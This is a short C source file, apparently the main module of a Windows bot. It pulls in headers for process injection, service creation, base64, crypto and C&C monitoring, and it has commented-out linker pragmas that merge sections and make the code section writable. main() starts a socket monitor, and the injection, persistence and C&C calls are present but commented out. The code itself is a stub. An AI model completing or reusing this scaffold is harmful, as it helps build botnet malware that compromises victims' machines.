// archivo principal del bot
#include <WinSock2.h>
#include <MSWSock.h>
#include <wininet.h>
#include <WinCrypt.h>
#include <windows.h>
#include "command.h"
#include "base64.h"
#include "http.h"
#include "inject.h"
#include "sock.h"
#include "service.h"
#include "cc_monitor.h"
#include "config.h"




/*
#if defined(_MSC_VER) 
	#pragma comment(lib, "wininet.lib")
	#pragma comment(lib, "crypt32.lib")
	#pragma comment(lib, "psapi.lib")
	#pragma comment(lib, "advapi32.lib")
	#pragma comment(lib, "ws2_32.lib")
	#pragma comment(lib, "mswsock.lib")
	#pragma comment(linker, "/SECTION:.text,EWR")
	#pragma comment(linker, "/FILEALIGN:16")
	#pragma comment(linker, "/ALIGN:16")
	#pragma comment(linker, "/MERGE:.rdata=.data")  //
	#pragma comment(linker, "/MERGE:.text=.data")	// merge reloc
	#pragma comment(linker, "/MERGE:.reloc=.data")	// 
	#pragma optimize("gsy", on)

	#pragma comment(linker, "/OPT:NOREF")
	#pragma optimize("", off) 

#endif
*/

int cr1m3_init;

int __InitializeComponents();


int main(int argc, char *argv[]) {
	//__monitor_http(0);
	__monitor_socket(0);

// Initializing components	
	__InitializeComponents();


// Inject
	//	__inject_rthread(a);
	//	__inject_rthread_rtl(a);
	//	__inject_rthread_w0w64();

//Service	
//	__create_service();

//Monitors C&C
	//__monitor_socket();
	//__monitor_http();


//End code ;)
	ExitProcess(0xFF);	
	return 0;
}


int __InitializeComponents() {
	return(26);
}


//int cr1m3_end;
